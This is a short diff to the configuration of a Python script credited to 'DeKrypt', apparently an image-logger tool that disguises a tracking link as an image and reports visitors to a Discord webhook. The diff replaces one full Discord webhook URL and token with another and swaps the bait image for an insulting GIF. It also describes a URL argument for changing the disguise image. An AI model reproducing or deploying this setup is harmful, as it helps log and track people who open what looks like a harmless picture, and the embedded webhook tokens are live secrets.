@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1350740925307162715/Z0vEZQ8M5HFyDBsA30RrHX8FQhakyUwLtZ2tXxujnYCdTcMAxxZrsYIo7KoJULfkQBkv",
-    "image": "https://tenor.com/view/sportsmanias-animated-emojis-st-patricks-day-st-pattys-day-happy-st-patricks-day-gif-25035870", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1357066665787003024/10Ps0-00mBl316HesZZEIh93uwkh8H7QKp6JRUAj3hG9ysvf8QG_ojGtIFfttHbbzs8D",
+    "image": "https://tenor.com/view/twenty-century-fox-meme-gfy-go-fuck-yourself-meme-get-lost-gif-26260205", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
